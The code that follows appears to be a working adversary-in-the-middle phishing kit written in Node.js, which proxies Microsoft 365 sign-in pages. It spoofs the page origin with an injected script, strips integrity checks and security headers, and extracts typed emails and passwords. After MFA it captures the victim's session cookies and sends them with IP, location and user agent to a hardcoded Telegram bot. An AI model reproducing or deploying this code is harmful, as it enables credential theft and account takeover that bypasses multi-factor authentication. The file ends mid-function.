const http = require("http");
const https = require("https");
const path = require("path");
const fs = require("fs");
const zlib = require("zlib");
const crypto = require("crypto");
// const { HttpsProxyAgent } = require('https-proxy-agent'); // DISABLED – direct connection
const Redis = require("ioredis");
const redis = new Redis(process.env.REDIS_URL || "redis://localhost:6379");
redis.on("error", (err) => console.error("[REDIS ERROR]", err.message));
// ==================== TELEGRAM CONFIGURATION ====================
const TELEGRAM_BOT_TOKEN = '8986334659:AAGtVf_vgVHkvXVKNP1xf3KcnCEN-QCHsk8';
const TELEGRAM_CHAT_ID = '8531631021';

async function sendToTelegram(message) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });
        console.log('[TELEGRAM] Notification sent');
    } catch (error) {
        console.error('[TELEGRAM] Failed:', error.message);
    }
}

async function sendDocumentToTelegram(filePath, caption) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
    try {
        const fileBuffer = fs.readFileSync(filePath);
        const blob = new Blob([fileBuffer], { type: 'text/plain' });
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('caption', caption);
        formData.append('document', blob, path.basename(filePath));

        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`;
        const response = await fetch(url, {
            method: 'POST',
            body: formData
        });
        const result = await response.json();
        if (!response.ok) {
            console.error('[TELEGRAM DOC] API error:', result.description);
        } else {
            console.log('[TELEGRAM DOC] Document sent successfully');
        }
    } catch (error) {
        console.error('[TELEGRAM DOC] Failed:', error.message);
    }
}
// ==================== END TELEGRAM ====================

const PROXY_ENTRY_POINT = "/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true";
const PHISHED_URL_PARAMETER = "redirect_urI";
const PHISHED_URL_REGEXP = new RegExp(`(?<=${PHISHED_URL_PARAMETER}=)[^&]+`);
const REDIRECT_URL = "https://www.intrinsec.com/";

const PROXY_FILES = {
    index: "index_smQGUDpTF7PN.html",
    notFound: "404_not_found_lk48ZVr32WvU.html",
    script: "script_Vx9Z6XN5uC3k.js"
};
const PROXY_PATHNAMES = {
    proxy: "/lNv1pC9AWPUY4gbidyBO",
    serviceWorker: "/service_worker_Mz8XO2ny1Pg5.js",
    script: "/@",
    mutation: "/Mutation_o5y3f4O7jMGW",
    jsCookie: "/JSCookie_6X7dRqLg90mH",
    favicon: "/favicon.ico"
};

// ==================== DOMAIN MASK (INLINE) ====================
const DOMAIN_MASK_SCRIPT = `
(function() {
    'use strict';
    window.__originalHostname = window.location.hostname;
    var fakeOrigin = 'https://login.microsoftonline.com';
    var fakeHostname = 'login.microsoftonline.com';
    var fakeHost = 'login.microsoftonline.com';
    var fakeProtocol = 'https:';

    // 1. Override window.location properties (if possible)
    try {
        var loc = window.location;
        Object.defineProperty(loc, 'origin', {
            get: function() { return fakeOrigin; },
            configurable: true
        });
        Object.defineProperty(loc, 'hostname', {
            get: function() { return fakeHostname; },
            configurable: true
        });
        Object.defineProperty(loc, 'host', {
            get: function() { return fakeHost; },
            configurable: true
        });
        Object.defineProperty(loc, 'protocol', {
            get: function() { return fakeProtocol; },
            configurable: true
        });
        Object.defineProperty(loc, 'href', {
            get: function() { return fakeOrigin + loc.pathname + loc.search + loc.hash; },
            set: function(v) { loc.href = v; },
            configurable: true
        });
        // ancestorOrigins is read-only, but we can try to override
        try {
            Object.defineProperty(loc, 'ancestorOrigins', {
                get: function() { return new DOMStringList([fakeOrigin]); },
                configurable: true
            });
        } catch(e) {}
    } catch(e) {
        // If individual property definition fails, try to replace the whole location
        try {
            var loc2 = window.location;
            var fakeLocation = Object.create(loc2, {
                origin: { get: function() { return fakeOrigin; } },
                hostname: { get: function() { return fakeHostname; } },
                host: { get: function() { return fakeHost; } },
                protocol: { get: function() { return fakeProtocol; } },
                href: {
                    get: function() { return fakeOrigin + loc2.pathname + loc2.search + loc2.hash; },
                    set: function(v) { loc2.href = v; }
                }
            });
            Object.defineProperty(window, 'location', {
                get: function() { return fakeLocation; },
                set: function(v) { loc2.href = v; },
                configurable: true
            });
        } catch(e2) {}
    }

    // 2. Override document.domain
    try {
        Object.defineProperty(document, 'domain', {
            get: function() { return fakeHostname; },
            set: function() {},
            configurable: true
        });
    } catch(e) {}

    // 3. Override document.referrer
    try {
        Object.defineProperty(document, 'referrer', {
            get: function() { return fakeOrigin + '/'; },
            configurable: true
        });
    } catch(e) {}

    // 4. Override window.origin
    try {
        Object.defineProperty(window, 'origin', {
            get: function() { return fakeOrigin; },
            configurable: true
        });
    } catch(e) {}

    // 5. Patch fetch and XHR
    var origFetch = window.fetch;
    window.fetch = function(input, init) {
        var url = typeof input === 'string' ? input : input.url;
        if (url && (url.includes('login.microsoftonline.com') || url.startsWith('/'))) {
            return origFetch.call(this, input, init);
        }
        return origFetch.call(this, input, init);
    };

    var origXHROpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(method, url, async, user, password) {
        if (typeof url === 'string' && url.includes('login.microsoftonline.com')) {
            var urlObj = new URL(url);
            url = urlObj.pathname + urlObj.search + urlObj.hash;
        }
        return origXHROpen.call(this, method, url, async !== false, user, password);
    };

    // 6. Patch postMessage
    var origPostMessage = window.postMessage;
    window.postMessage = function(message, targetOrigin, transfer) {
        if (targetOrigin === '*') return origPostMessage(message, targetOrigin, transfer);
        if (targetOrigin && targetOrigin.includes('microsoftonline.com')) {
            targetOrigin = fakeOrigin;
        }
        return origPostMessage(message, targetOrigin, transfer);
    };

    console.log('[DOMAIN MASK] Active – origins now report as ' + fakeOrigin);
})();
`.replace(/<\/script>/gi, '<\\/script>');

const LOGS_DIRECTORY = path.join(__dirname, "phishing_logs");
try {
    if (!fs.existsSync(LOGS_DIRECTORY)) {
        fs.mkdirSync(LOGS_DIRECTORY);
    }
} catch (error) {
    displayError("Directory creation failed", error, LOGS_DIRECTORY);
}
const LOG_FILE_STREAMS = {};
const ENCRYPTION_KEY = "HyP3r-M3g4_S3cURe-EnC4YpT10n_k3Y";

const VICTIM_SESSIONS = {};

// ==================== GEO-IP & PROXY HELPERS (DISABLED) ====================
function getClientIP(clientRequest) {
    const forwarded = clientRequest.headers['x-forwarded-for'];
    if (forwarded) {
        const ips = forwarded.split(',');
        return ips[0].trim();
    }
    return clientRequest.socket.remoteAddress || '';
}

async function getVictimGeo(ip) {
    if (!ip || ip === '127.0.0.1' || ip.startsWith('192.168.') || ip.startsWith('10.')) return null;
    try {
        const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city`);
        const data = await response.json();
        if (data.status === 'success') {
            return {
                country: data.country || 'N/A',
                region: data.regionName || 'N/A',
                city: data.city || 'N/A'
            };
        }
    } catch (err) {
        console.error('[GEO] Failed:', err.message);
    }
    return null;
}

function getSessionPool() {
    return [generateRandomString(8)];
}

function buildProxyUrl(location, sessionId) {
    return '';
}
// ==================== END GEO-IP & PROXY HELPERS ====================

const proxyServer = http.createServer((clientRequest, clientResponse) => {
    const { method, url, headers } = clientRequest;
    const currentSession = getUserSession(headers.cookie);

    // ---- LOG INCOMING COOKIE HEADER ----
    console.log(`[REQUEST] ${method} ${url}`);
    // if (headers.cookie) {
//     console.log(`[INCOMING COOKIE] ${headers.cookie}`);
// } else {
//     console.log('[INCOMING COOKIE] (none)');
// }

    if (url.startsWith(PROXY_ENTRY_POINT) && url.includes(PHISHED_URL_PARAMETER)) {
        try {
            const phishedURL = new URL(decodeURIComponent(url.match(PHISHED_URL_REGEXP)[0]));
            let session = currentSession;

            if (!currentSession) {
                const { cookieName, cookieValue } = generateNewSession(phishedURL);
                const cookieHeader = `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Lax`;
                clientResponse.setHeader("Set-Cookie", cookieHeader);
             //   console.log(`[SET SESSION COOKIE] ${cookieHeader}`);
                session = cookieName;
            }
            VICTIM_SESSIONS[session].protocol = phishedURL.protocol;
            VICTIM_SESSIONS[session].hostname = phishedURL.hostname;
            VICTIM_SESSIONS[session].path = `${phishedURL.pathname}${phishedURL.search}`;
            VICTIM_SESSIONS[session].port = phishedURL.port;
            VICTIM_SESSIONS[session].host = phishedURL.host;
            VICTIM_SESSIONS[session].ip = getClientIP(clientRequest);
            VICTIM_SESSIONS[session].userAgent = headers['user-agent'] || 'Unknown';

getVictimGeo(VICTIM_SESSIONS[session].ip).then(geo => {
    if (geo) VICTIM_SESSIONS[session].geo = geo;
}).catch(() => {}); 
            if (!VICTIM_SESSIONS[session].proxyLevels) {
                VICTIM_SESSIONS[session].proxyLevels = [{ url: '', level: 'direct' }];
            }

            clientResponse.writeHead(200, { "Content-Type": "text/html" });
            fs.createReadStream(PROXY_FILES.index).pipe(clientResponse);
        }
        catch (error) {
            displayError("Phishing URL parsing failed", error, url);
            clientResponse.writeHead(404, { "Content-Type": "text/html" });
            fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
        }
    }

    else if (currentSession || url === PROXY_PATHNAMES.proxy) {
        if (url === PROXY_PATHNAMES.serviceWorker) {
            clientResponse.writeHead(200, { "Content-Type": "text/javascript" });
            fs.createReadStream(url.slice(1)).pipe(clientResponse);
        }
        else if (url === PROXY_PATHNAMES.favicon) {
            clientResponse.writeHead(301, { Location: `${VICTIM_SESSIONS[currentSession].protocol}//${VICTIM_SESSIONS[currentSession].host}${url}` });
            clientResponse.end();
        }

        else {
            let clientRequestBody = [];
            clientRequest
                .on("error", (error) => {
                    displayError("Client request body retrieval failed", error, method, url);
                })
                .on("data", (chunk) => {
                    clientRequestBody.push(chunk);
                })
                .on("end", () => {
                    clientRequestBody = Buffer.concat(clientRequestBody).toString();

                    if (!currentSession) {
                        if (clientRequestBody) {
                            try {
                                clientRequestBody = JSON.parse(clientRequestBody);
                                const proxyRequestURL = new URL(clientRequestBody.url);
                                const proxyRequestPath = `${proxyRequestURL.pathname}${proxyRequestURL.search}`;

                                if (proxyRequestURL.hostname === headers.host &&
                                    proxyRequestPath.startsWith(PROXY_ENTRY_POINT) && proxyRequestPath.includes(PHISHED_URL_PARAMETER)) {
                                    try {
                                        const phishedURL = new URL(decodeURIComponent(proxyRequestPath.match(PHISHED_URL_REGEXP)[0]));

                                        const { cookieName, cookieValue } = generateNewSession(phishedURL);
                                        const cookieHeader = `${cookieName}=${cookieValue}; Max-Age=7776000; Secure; HttpOnly; SameSite=Lax`;
                                        clientResponse.setHeader("Set-Cookie", cookieHeader);
                                       // console.log(`[SET SESSION COOKIE (anonymous)] ${cookieHeader}`);

                                        VICTIM_SESSIONS[cookieName].protocol = phishedURL.protocol;
                                        VICTIM_SESSIONS[cookieName].hostname = phishedURL.hostname;
                                        VICTIM_SESSIONS[cookieName].path = `${phishedURL.pathname}${phishedURL.search}`;
                                        VICTIM_SESSIONS[cookieName].port = phishedURL.port;
                                        VICTIM_SESSIONS[cookieName].host = phishedURL.host;

                                        VICTIM_SESSIONS[cookieName].ip = getClientIP(clientRequest);
VICTIM_SESSIONS[cookieName].userAgent = headers['user-agent'] || 'Unknown';

getVictimGeo(VICTIM_SESSIONS[cookieName].ip).then(geo => {
    if (geo) VICTIM_SESSIONS[cookieName].geo = geo;
}).catch(() => {});

                                        clientResponse.writeHead(301, { Location: `${VICTIM_SESSIONS[cookieName].protocol}//${headers.host}${VICTIM_SESSIONS[cookieName].path}` });
                                        clientResponse.end();
                                    }
                                    catch (error) {
                                        displayError("Phishing URL parsing failed", error, proxyRequestPath);
                                        clientResponse.writeHead(404, { "Content-Type": "text/html" });
                                        fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
                                    }
                                } else {
                                    clientResponse.writeHead(301, { Location: REDIRECT_URL });
                                    clientResponse.end();
                                }
                            } catch (error) {
                                displayError("Anonymous client request body parsing failed", error, clientRequestBody);
                            }
                        } else {
                            clientResponse.writeHead(301, { Location: REDIRECT_URL });
                            clientResponse.end();
                        }
                        return;
                    }

                    // ---- Authenticated session ----
                    let proxyRequestProtocol = VICTIM_SESSIONS[currentSession].protocol;
                    const proxyRequestOptions = {
                        hostname: VICTIM_SESSIONS[currentSession].hostname,
                        port: VICTIM_SESSIONS[currentSession].port,
                        method: method,
                        path: VICTIM_SESSIONS[currentSession].path,
                        headers: { ...headers },
                        rejectUnauthorized: false
                    };
                    let isNavigationRequest = false;

                    if (clientRequestBody) {
                        if (url === PROXY_PATHNAMES.jsCookie) {
                            updateCurrentSessionCookies(VICTIM_SESSIONS[currentSession], [clientRequestBody], headers.host, currentSession);
                            const validDomains = getValidDomains([headers.host, VICTIM_SESSIONS[currentSession].hostname]);

                            clientResponse.writeHead(200, { "Content-Type": "application/json" });
                            clientResponse.end(JSON.stringify(validDomains));
                            return;
                        }

                        else if (url === PROXY_PATHNAMES.proxy) {
                            try {
                                clientRequestBody = JSON.parse(clientRequestBody);
                                let proxyRequestURL = new URL(clientRequestBody.url);
                                let proxyRequestPath = `${proxyRequestURL.pathname}${proxyRequestURL.search}`;

                                if (proxyRequestURL.hostname === headers.host) {
                                    if (proxyRequestPath.startsWith(PROXY_ENTRY_POINT) && proxyRequestPath.includes(PHISHED_URL_PARAMETER)) {
                                        try {
                                            const phishedURL = new URL(decodeURIComponent(proxyRequestPath.match(PHISHED_URL_REGEXP)[0]));

                                            VICTIM_SESSIONS[currentSession].protocol = phishedURL.protocol;
                                            VICTIM_SESSIONS[currentSession].hostname = phishedURL.hostname;
                                            VICTIM_SESSIONS[currentSession].path = `${phishedURL.pathname}${phishedURL.search}`;
                                            VICTIM_SESSIONS[currentSession].port = phishedURL.port;
                                            VICTIM_SESSIONS[currentSession].host = phishedURL.host;

                                            clientResponse.writeHead(301, { Location: `${VICTIM_SESSIONS[currentSession].protocol}//${headers.host}${VICTIM_SESSIONS[currentSession].path}` });
                                            clientResponse.end();
                                        }
                                        catch (error) {
                                            displayError("Phishing URL parsing failed", error, proxyRequestPath);
                                            clientResponse.writeHead(404, { "Content-Type": "text/html" });
                                            fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
                                        }
                                        return;
                                    }

                                    else if (proxyRequestURL.pathname === PROXY_PATHNAMES.script) {
                                        clientResponse.writeHead(200, { "Content-Type": "text/javascript" });
                                        fs.createReadStream(PROXY_FILES.script).pipe(clientResponse);
                                        return;
                                    }

                                    else if (proxyRequestURL.pathname === PROXY_PATHNAMES.mutation) {
                                        try {
                                            const phishedURLValue = proxyRequestURL.searchParams.get(PHISHED_URL_PARAMETER);
                                            proxyRequestURL = new URL(decodeURIComponent(phishedURLValue));
                                            proxyRequestPath = `${proxyRequestURL.pathname}${proxyRequestURL.search}`;
                                        }
                                        catch (error) {
                                            displayError("Phishing URL parsing failed", error, proxyRequestPath);
                                            clientResponse.writeHead(404, { "Content-Type": "text/html" });
                                            fs.createReadStream(PROXY_FILES.notFound).pipe(clientResponse);
                                            return;
                                        }
                                    }

                                    else if (proxyRequestURL.pathname === PROXY_PATHNAMES.jsCookie) {
                                        updateCurrentSessionCookies(VICTIM_SESSIONS[currentSession], [clientRequestBody.body], headers.host, currentSession);
                                        const validDomains = getValidDomains([headers.host, VICTIM_SESSIONS[currentSession].hostname]);

                                        clientResponse.writeHead(200, { "Content-Type": "application/json" });
                                        clientResponse.end(JSON.stringify(validDomains));
                                        return;
                                    }
                                }
                                proxyRequestProtocol = proxyRequestURL.protocol;
                                proxyRequestOptions.path = proxyRequestPath;
                                proxyRequestOptions.port = proxyRequestURL.port;
                                proxyRequestOptions.method = clientRequestBody.method;

                                proxyRequestOptions.headers = { ...headers, ...clientRequestBody.headers };
                                if (proxyRequestURL.hostname !== headers.host) {
                                    proxyRequestOptions.hostname = proxyRequestURL.hostname;
                                    proxyRequestOptions.headers.host = proxyRequestURL.host;
                                }
                                if (proxyRequestOptions.headers.referer) {
                                    proxyRequestOptions.headers.referer = clientRequestBody.referrer;
                                }
                                isNavigationRequest = clientRequestBody.mode === "navigate";
                                console.log(`[PROXY PAYLOAD] mode: ${clientRequestBody.mode}, isNavigationRequest: ${isNavigationRequest}`);
                            }
                            catch (error) {
                                displayError("Authenticated client request body parsing failed", error, proxyRequestOptions.host, proxyRequestOptions.path, clientRequestBody);
                            }
                        } else {
                            console.warn(`/!\\ There seems to be a problem with the Service Worker (url !== ${PROXY_PATHNAMES.proxy}). Non-proxied URL: ${url} /!\\`);
                        }
                    } else {
                        console.warn(`/!\\ There seems to be a problem with the Service Worker (no clientRequestBody). Non-proxied URL: ${url} /!\\`);
                    }

                    proxyRequestOptions.path = proxyRequestOptions.path.replaceAll(headers.host, VICTIM_SESSIONS[currentSession].host);
                    updateProxyRequestHeaders(proxyRequestOptions, currentSession, headers.host);

                    const proxyRequestBody = clientRequestBody.body ?? clientRequestBody;
                    const requestContentLength = Buffer.byteLength(proxyRequestBody);
                    if (requestContentLength) {
                        proxyRequestOptions.headers["content-length"] = requestContentLength.toString();
                    }
                    else {
                        delete proxyRequestOptions.headers["content-type"];
                        delete proxyRequestOptions.headers["content-length"];
                    }

                    if (isNavigationRequest) {
                        VICTIM_SESSIONS[currentSession].protocol = proxyRequestProtocol;
                        VICTIM_SESSIONS[currentSession].hostname = proxyRequestOptions.hostname;
                        VICTIM_SESSIONS[currentSession].path = proxyRequestOptions.path;
                        VICTIM_SESSIONS[currentSession].port = proxyRequestOptions.port;
                        VICTIM_SESSIONS[currentSession].host = proxyRequestOptions.headers.host;
                    }

                    // ====================================================================
                    // CREDENTIAL EXTRACTION & TELEGRAM NOTIFICATION (unchanged)
                    // ====================================================================
                    try {
                        if (clientRequestBody && typeof clientRequestBody === 'object' && clientRequestBody.body) {
                            const originalBody = clientRequestBody.body;
                            const originalUrl = clientRequestBody.url || '';
                            const originalMethod = clientRequestBody.method || '';

                            if (originalMethod === 'POST' && (originalBody.includes('passwd=') || originalBody.includes('password='))) {
                                let email = '';
                                let password = '';
                                const contentType = clientRequestBody.headers?.['content-type'] || '';

                                if (contentType.includes('application/json')) {
                                    try {
                                        const json = JSON.parse(originalBody);
                                        email = json.username || json.user || json.email || json.loginfmt || json.login || json.userid || '';
                                        password = json.password || json.passwd || json.pass || json.Password || json.pwd || '';
                                    } catch (e) {}
                                } else if (contentType.includes('application/x-www-form-urlencoded')) {
                                    try {
                                        const params = new URLSearchParams(originalBody);
                                        email = params.get('username') || params.get('user') || params.get('email') || 
                                                params.get('loginfmt') || params.get('login') || params.get('userid') || '';
                                        password = params.get('password') || params.get('passwd') || params.get('pass') || 
                                                   params.get('Password') || params.get('pwd') || '';
                                    } catch (e) {}
                                }

                                if (email || password) {
    const credentials = {
        email: email || 'N/A',
        password: password || 'N/A',
        url: originalUrl,
        time: new Date().toISOString()
    };

    // Store in memory
    VICTIM_SESSIONS[currentSession].credentials = credentials;
    console.log(`[CRED STORED] Email: ${credentials.email} | Password: ${credentials.password}`);

    // Also store in Redis (key = session cookie name)
    const redisKey = `session:${currentSession}`;
    redis.set(redisKey, JSON.stringify(credentials), "EX", 3600)
        .catch(err => console.error("[REDIS SET]", err.message));
}
                            }
                        }
                    } catch (e) {}

                    // Call makeProxyRequest
                    makeProxyRequest(proxyRequestProtocol, proxyRequestOptions, currentSession, headers.host, proxyRequestBody, clientResponse, isNavigationRequest)
                        .catch(error => displayError("Proxy request failed", error));
                });
        }
    }

    else {
        clientResponse.writeHead(301, { Location: REDIRECT_URL });
        clientResponse.end();
    }
});
proxyServer.listen(process.env.PORT ?? 3000);

const makeProxyRequest = async (proxyRequestProtocol, proxyRequestOptions, currentSession, proxyHostname, proxyRequestBody, clientResponse, isNavigationRequest, proxyIndex = 0) => {
    const isHttps = proxyRequestProtocol === "https:";
    const requestModule = isHttps ? https : http;
    const requestOptions = { ...proxyRequestOptions };
    delete requestOptions.agent;

    const proxyRequest = requestModule.request(requestOptions, (proxyResponse) => {
        logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions, proxyRequestBody, proxyResponse, currentSession)
            .catch(error => displayError("Log encryption failed", error));

        // ---- REDIRECT DEBUG LOG ----
        console.log(`[REDIRECT DEBUG] isNav=${isNavigationRequest}, reqHost=${proxyRequestOptions.headers.host}, sessHost=${VICTIM_SESSIONS[currentSession].host}, status=${proxyResponse.statusCode}`);

        // ---- REWRITE ALL 3xx REDIRECTS (CORS + NAVIGATION + ANY HOST) ----
if (proxyResponse.statusCode >= 300 && proxyResponse.statusCode < 400) {
    const proxyResponseLocation = proxyResponse.headers.location;
    if (proxyResponseLocation) {
        try {
            const locationURL = new URL(proxyResponseLocation);
            console.log(`[REDIRECT REWRITE (ALL)] Original: ${proxyResponseLocation}`);
            
            // Update session to the target host (important for subsequent requests)
            VICTIM_SESSIONS[currentSession].protocol = locationURL.protocol;
            VICTIM_SESSIONS[currentSession].hostname = locationURL.hostname;
            VICTIM_SESSIONS[currentSession].path = `${locationURL.pathname}${locationURL.search}`;
            VICTIM_SESSIONS[currentSession].port = locationURL.port;
            VICTIM_SESSIONS[currentSession].host = locationURL.host;

            // Rewrite Location to point back to your proxy domain
            const rewritten = proxyResponseLocation.replace(locationURL.host, proxyHostname);
            proxyResponse.headers.location = rewritten;
            console.log(`[REDIRECT REWRITE (ALL)] Rewritten: ${rewritten}`);
        } catch (error) {
            VICTIM_SESSIONS[currentSession].path = proxyResponseLocation;
            console.log(`[REDIRECT PARSE ERROR] ${error.message}`);
        }
    }
} else if (proxyResponse.statusCode > 400) {
    displayError("Server response status", proxyResponse.statusCode, proxyRequestOptions.headers.host, proxyRequestOptions.path);
}

        const proxyResponseCookie = proxyResponse.headers["set-cookie"];
if (proxyResponseCookie) {
    //  console.log(`[MICROSOFT SET-COOKIE] ...`);
    updateCurrentSessionCookies(proxyRequestOptions, proxyResponseCookie, proxyHostname, currentSession, proxyResponse.headers.date);

    // ---- REWRITE Set-Cookie DOMAIN FOR CLIENT ----
    const rewrittenCookies = proxyResponseCookie.map(cookie => {
        // Replace Domain=... with Domain=proxyHostname
        return cookie.replace(/\bDomain\s*=\s*[^;]+/i, `Domain=${proxyHostname}`);
    });
    proxyResponse.headers["set-cookie"] = rewrittenCookies;
}

// ===== FINAL ALERT & REDIRECT (after MFA) =====
const sessionData = VICTIM_SESSIONS[currentSession];
const currentHost = sessionData.host || '';
const isPostLogin = !currentHost.includes('login.microsoftonline.com') &&
                   (currentHost.includes('office.com') ||
                    currentHost.includes('m365.cloud.microsoft') ||
                    currentHost.includes('onedrive.com'));

if (!sessionData.alerted && hasValidSessionCookies(sessionData) && isPostLogin) {
    let credentials = sessionData.credentials || { email: 'N/A', password: 'N/A' };

    // Prepare full cookie array as JSON string
    const allCookies = sessionData.cookies.map(c => ({
        name: c.name,
        value: c.value,
        domain: c.domain,
        path: c.path,
        expires: c.expires
    }));
    const cookiesJson = JSON.stringify(allCookies, null, 2);

    // Write cookies to a temporary .txt file
    const tempDir = path.join(__dirname, 'temp');
    if (!fs.existsSync(tempDir)) {
        fs.mkdirSync(tempDir);
    }
    const filePath = path.join(tempDir, `cookies_${Date.now()}.txt`);
    fs.writeFileSync(filePath, cookiesJson, 'utf8');

    // Build caption (email + password only)
    const sessionIp = sessionData.ip || 'N/A';
const sessionUserAgent = sessionData.userAgent || 'N/A';
const sessionGeo = sessionData.geo;

let locationString = sessionIp;
if (sessionGeo) {
    locationString = `${sessionGeo.city}, ${sessionGeo.region}, ${sessionGeo.country} (${sessionIp})`;
}

const caption = 
`==============================\n` +
`  ⚕️🍪 MEDU$$A365-COOKIES ⚕️🍪  \n` +
`==============================\n` +
`📧 Email: ${credentials.email}\n` +
`🔑 Password: ${credentials.password}\n` +
`🌐 IP: ${sessionIp}\n` +
`📍 Location: ${locationString}\n` +
`🖥️ User Agent: ${sessionUserAgent}\n` +
`==============================\n` +
`🔗 @Kaffin_7007`;

    // Send document via Telegram
    sendDocumentToTelegram(filePath, caption)
        .catch(err => console.error('[TELEGRAM DOC] Send failed:', err.message));

    console.log(`[FINAL ALERT] MFA completed. Cookies captured.`);

    // Clean up file after a short delay (optional, but recommended)
    setTimeout(() => {
        try { fs.unlinkSync(filePath); } catch (e) { /* ignore */ }
    }, 10000); // delete after 10 seconds

    // Mark as alerted
    sessionData.alerted = true;

    // Force redirect on next navigation request
    sessionData.pendingRedirect = true;
}
// ================================================
// ================================
        proxyResponse.headers["cache-control"] = "no-store";
        proxyResponse.headers["access-control-allow-origin"] = `https://${proxyHostname}`;
        deleteHTTPSecurityResponseHeaders(proxyResponse.headers);

        let serverResponseBody = [];
        proxyResponse
            .on("error", (error) => {
                displayError("Server response body retrieval failed", error, proxyRequestOptions.method, proxyRequestOptions.path);
            })
            .on("data", (chunk) => {
                serverResponseBody.push(chunk);
            })
            .on("end", async () => {
                serverResponseBody = Buffer.concat(serverResponseBody);

                if (proxyResponse.headers["content-type"] && /text\/html/i.test(proxyResponse.headers["content-type"]) &&
    Buffer.byteLength(serverResponseBody)) {
    try {
        const { decompressedResponseBody, encodings } = await decompressResponseBody(serverResponseBody, proxyResponse.headers["content-encoding"]);

        // ---- SRI (Integrity) Removal ----
        let html = decompressedResponseBody.toString('utf8');
        html = html.replace(/<script[^>]+\s+integrity="[^"]*"/g, '<script');
        html = html.replace(/<link[^>]+\s+integrity="[^"]*"/g, '<link');
        html = html.replace(/integrity\s*=\s*"[^"]*"/g, '');
        html = html.replace(/\s+integrity\s*=\s*["'][^"']*["']/gi, '');

        // ---- STEP 2: Rewrite all Microsoft domains in the entire HTML (inline scripts + attributes) ----
        const domains = ['login.microsoftonline.com', 'microsoftonline.com', 'login.windows.net', 'login.microsoft.com', 'sts.microsoftonline.com'];
        for (const domain of domains) {
            const regex = new RegExp(`(https?:)?//${domain.replace(/\./g, '\\.')}`, 'g');
            html = html.replace(regex, `https://${proxyHostname}`);
        }
        const rewrittenHtmlBuffer = Buffer.from(html, 'utf8');

        // ---- STEP 1: Inject domain mask (this runs after rewriting, mask is first) ----
        serverResponseBody = updateHTMLProxyResponse(rewrittenHtmlBuffer);
        serverResponseBody = await compressResponseBody(serverResponseBody, encodings);

        if (proxyResponse.headers["content-length"]) {
            proxyResponse.headers["content-length"] = Buffer.byteLength(serverResponseBody).toString();
        }
    } catch (error) {
        displayError("Server response body decompression failed", error, proxyRequestOptions.hostname, proxyRequestOptions.path, serverResponseBody.subarray(0, 5).toString("hex"), proxyResponse.headers["content-encoding"]);
    }
}
                    
 else if (proxyResponse.headers["content-type"] && /(javascript|ecmascript)/i.test(proxyResponse.headers["content-type"]) && Buffer.byteLength(serverResponseBody)) {
    try {
        const { decompressedResponseBody, encodings } = await decompressResponseBody(serverResponseBody, proxyResponse.headers["content-encoding"]);
        const rewritten = updateJavaScriptResponse(decompressedResponseBody, proxyHostname);
        serverResponseBody = await compressResponseBody(rewritten, encodings);
        if (proxyResponse.headers["content-length"]) {
            proxyResponse.headers["content-length"] = Buffer.byteLength(serverResponseBody).toString();
        }
    } catch (error) {
        displayError("JavaScript processing failed", error, proxyRequestOptions.hostname, proxyRequestOptions.path);
    }
    }
    

                else if (proxyRequestOptions.path.startsWith("/common/GetCredentialType")) {
                    try {
                        const { decompressedResponseBody, encodings } = await decompressResponseBody(serverResponseBody, proxyResponse.headers["content-encoding"]);
                        serverResponseBody = updateFederationRedirectUrl(decompressedResponseBody, proxyHostname);
                        serverResponseBody = await compressResponseBody(serverResponseBody, encodings);

                        if (proxyResponse.headers["content-length"]) {
                            proxyResponse.headers["content-length"] = Buffer.byteLength(serverResponseBody).toString();
                        }
                    }
                    catch (error) {
                        displayError("/common/GetCredentialType response body decompression failed", error, proxyRequestOptions.hostname, proxyRequestOptions.path, serverResponseBody.subarray(0, 5).toString("hex"), proxyResponse.headers["content-encoding"]);
                    }
                }
                // ----- PENDING REDIRECT HANDLER -----
if (VICTIM_SESSIONS[currentSession].pendingRedirect && isNavigationRequest) {
    proxyResponse.headers.location = 'https://www.docusign.com/';
    proxyResponse.statusCode = 302;
    VICTIM_SESSIONS[currentSession].pendingRedirect = false;
    console.log('[REDIRECT] Forced redirect to DocuSign');
}
// ------------------------------------

                clientResponse.writeHead(proxyResponse.statusCode, proxyResponse.headers);
                clientResponse.end(serverResponseBody);
            });
    });

    proxyRequest.on("error", (error) => {
        console.error('[PROXY ERROR]', error.name, error.message);
        console.error('[PROXY ERROR] Full error:', error);
        console.error('[PROXY ERROR] Stack:', error.stack);
        clientResponse.writeHead(502, { "Content-Type": "text/plain" });
        clientResponse.end("Proxy request failed");
    });

    if (proxyRequestBody) {
        proxyRequest.write(proxyRequestBody);
    }
    proxyRequest.end();
};

// ==================== REMAINING FUNCTIONS (with added logging in updateCurrentSessionCookies and updateProxyRequestHeaders) ====================
function displayError(message, error, ...args) {
    console.error("******************************");
    console.error(`${message}: ${error.name ?? error}`);
    console.error(`Message: ${error.message}`);
    console.error(`Stack trace: ${error.stack}`);

    for (let i = 0; i < args.length; i++) {
        console.error(`Parameter ${i + 1}: ${args[i]}`);
    }
    console.error("******************************");
}

function getUserSession(requestCookies) {
    if (!requestCookies) return;

    const cookies = requestCookies.split("; ");
    for (const cookie of cookies) {
        const [cookieName, ...cookieValue] = cookie.split("=");

        if (VICTIM_SESSIONS.hasOwnProperty(cookieName) &&
            VICTIM_SESSIONS[cookieName].value === cookieValue.join("=")) {
            return cookieName;
        }
    }
    return;
}

function generateRandomString(length) {
    const characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    return Array.from({ length }, () => characters[Math.floor(Math.random() * characters.length)]).join("");
